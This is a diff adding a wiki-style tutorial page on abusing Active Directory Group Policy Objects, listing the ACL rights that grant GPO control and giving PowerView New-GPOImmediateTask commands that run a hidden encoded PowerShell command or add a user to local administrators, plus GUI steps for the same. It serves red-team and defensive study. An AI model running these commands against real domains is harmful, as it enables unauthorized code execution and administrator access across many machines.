@@ -1,0 +1,66 @@
+# Group Policy Objects \(GPOs\)
+
+## Theory
+
+"Group Policy" is a management feature of Active Directory. It allows admins to manage computers and users. Group Policy Objetcs \(GPOs\) make up Group Policies. GPOs are associated to AD objects \(sites, domains, organizational units \(OUs\)\).
+
+> Group Policies can include security options, registry keys, software installation, and scripts for startup and shutdown and domain members refresh group policy settings every 90 minutes by default \(5 minutes for Domain Controllers\). This means that Group Policy enforces configured settings on the targeted computer.
+>
+> [adsecurity.org](https://adsecurity.org/?p=2716)
+
+In certain scenarios, an attacker can gain control over GPOs. Some ACEs can give that control \(see [this BlackHat conf](https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf), page 28\):
+
+* `WriteProperty` to the `GPC-File-Sys-Path` property of a GPO \(specific GUID specified\)
+* `GenericAll`, `GenericWrite`, `WriteProperty` to any property \(no GUID specified\)
+* `WriteDacl`, `WriteOwner`
+
+## Practice
+
+### Immediate Scheduled Task
+
+An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. The attacker can then gain access to all AD objects this GPO applies to. This can be achieved with [New-GPOImmediateTask](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).
+
+```bash
+New-GPOImmediateTask -Force -TaskName 'TaskName' -GPODisplayName 'GPODisplayName' -Command powershell -CommandArguments '-NoP -NonI -W Hidden -Enc JABXAGMA[...]BOz4=='
+```
+
+Another example of exploitation could be to add a user to the local administrators group.
+
+```bash
+New-GPOImmediateTask -Verbose -Force -TaskName 'TaskName' -GPODisplayName 'GPODisplayName' -Command cmd -CommandArguments "/c net localgroup administrators shutdown /add"
+```
+
+After a successful execution, the scheduled task can be removed with the following command.
+
+```bash
+New-GPOImmediateTask -Force -Remove -GPODisplayName 'GPODisplayName'
+```
+
+### Adding a user to the local admin group
+
+An attacker can also add a user to the local administrator group. This can be achieved with the Group Policy Management Editor.
+
+**Step 1**: create the user
+
+`Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Create > User name: <user>`
+
+**Step 2**: add the user to the local admin group
+
+`Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Update > Group name : <Administrators> > Members: Add: <user>`
+
+### Force Group Policy update
+
+Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: `gpupdate /force`.
+
+### Other exploitation paths
+
+In addition to the aforementioned exploitation paths, GPOs can be abused in other ways: leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.
+
+## References
+
+{% embed url="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" caption="" %}
+
+{% embed url="https://adsecurity.org/?p=2716" caption="" %}
+
+{% embed url="https://beta.hackndo.com/gpo-abuse-with-edit-settings/" caption="" %}
+
